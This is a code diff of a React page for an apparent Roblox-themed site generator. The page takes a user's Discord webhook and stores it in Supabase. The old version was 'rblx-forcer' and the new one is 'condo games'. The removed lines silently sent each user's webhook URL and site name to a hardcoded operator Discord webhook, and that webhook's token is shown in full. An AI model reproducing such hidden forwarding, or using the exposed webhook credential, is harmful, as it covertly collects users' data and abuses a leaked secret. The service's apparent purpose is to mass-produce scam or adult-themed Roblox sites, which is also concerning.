@@ -5,105 +5,89 @@ import { supabase } from "../supabaseClient";
 export default function HomePage() {
   const [directory, setDirectory] = useState("");
   const [webhook, setWebhook] = useState("");
+  const [links, setLinks] = useState(["", "", "", "", ""]);
   const [status, setStatus] = useState("");
 
   const handleGenerate = async () => {
     if (!directory || !webhook) {
-      setStatus("⚠️ Please enter both a directory and webhook URL");
+      setStatus("⚠️ Please fill in all fields.");
       return;
     }
 
-    setStatus("⏳ Creating site...");
+    setStatus("⏳ Generating your site...");
 
-    // Insert new record in Supabase
     const { data, error } = await supabase
       .from("websites")
-      .insert([{ directory, webhook_url: webhook }]);
+      .insert([{ directory, webhook_url: webhook, links }]);
 
     if (error) {
       setStatus("❌ Error: " + error.message);
       return;
     }
 
-    // Send Discord webhook message to user's webhook
-    try {
-      await fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: https://rblx-forcer.vercel.app/${directory}`,
-        }),
-      });
-    } catch (err) {
-      console.error("Webhook send failed", err);
-    }
+    // Send webhook
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `✅ Your condo website has been created!\n🔗 https://roblox-condo-games.vercel.app/${directory}`,
+      }),
+    });
 
-    // Send to permanent webhook
-    const permanentWebhook = "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA";
-    try {
-      await fetch(permanentWebhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [
-            {
-              title: "🚀 New Website Generated",
-              color: 0x00ff00,
-              fields: [
-                {
-                  name: "📁 Directory",
-                  value: directory,
-                  inline: true
-                },
-                {
-                  name: "🔗 User Webhook",
-                  value: webhook.substring(0, 50) + "...",
-                  inline: true
-                },
-                {
-                  name: "🌐 URL",
-                  value: `https://rblx-forcer.vercel.app/${directory}`
-                }
-              ],
-              timestamp: new Date().toISOString()
-            }
-          ]
-        }),
-      });
-    } catch (err) {
-      console.error("Permanent webhook send failed", err);
-    }
-
-    // Redirect user to their page
+    // Redirect user
     window.location.href = `/${directory}`;
   };
 
-  return (
-    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 text-white">
-      <h1 className="text-3xl font-bold mb-6">RBLX Generator</h1>
+  const updateLink = (index, value) => {
+    const newLinks = [...links];
+    newLinks[index] = value;
+    setLinks(newLinks);
+  };
 
-      <div className="bg-white/10 p-6 rounded-2xl shadow-xl w-80 flex flex-col gap-3">
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-pink-400 via-pink-500 to-pink-600 flex flex-col items-center justify-center text-white px-4">
+      <h1 className="text-4xl font-bold mb-2">Condo Games Website Gen 🩷</h1>
+      <p className="text-lg mb-8 opacity-90">Create your own live condo site instantly!</p>
+
+      <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-8 w-full max-w-md shadow-xl">
         <input
+          type="text"
+          placeholder="Enter Directory Name"
           value={directory}
           onChange={(e) => setDirectory(e.target.value)}
-          placeholder="Enter directory name"
-          className="px-3 py-2 rounded bg-white/20 text-white placeholder-gray-300"
+          className="w-full mb-3 p-3 bg-white/20 rounded-lg text-white placeholder-gray-300 focus:outline-none"
         />
+
         <input
+          type="url"
+          placeholder="Enter Discord Webhook URL"
           value={webhook}
           onChange={(e) => setWebhook(e.target.value)}
-          placeholder="Enter Discord Webhook URL"
-          className="px-3 py-2 rounded bg-white/20 text-white placeholder-gray-300"
+          className="w-full mb-5 p-3 bg-white/20 rounded-lg text-white placeholder-gray-300 focus:outline-none"
         />
+
+        {links.map((link, index) => (
+          <input
+            key={index}
+            type="url"
+            placeholder={`Game Link ${index + 1}`}
+            value={link}
+            onChange={(e) => updateLink(index, e.target.value)}
+            className="w-full mb-3 p-3 bg-white/20 rounded-lg text-white placeholder-gray-300 focus:outline-none"
+          />
+        ))}
+
         <button
           onClick={handleGenerate}
-          className="bg-white text-blue-700 font-semibold px-4 py-2 rounded-lg hover:bg-blue-200 transition"
+          className="w-full bg-pink-600 hover:bg-pink-700 transition p-3 rounded-xl font-semibold"
         >
-          Generate
+          💖 Generate Website
         </button>
 
-        {status && <p className="text-center mt-3">{status}</p>}
+        {status && <p className="mt-4 text-center">{status}</p>}
       </div>
+
+      <footer className="mt-10 opacity-70 text-sm">Created by Mark Yui 💞</footer>
     </div>
   );
-            }
+        }
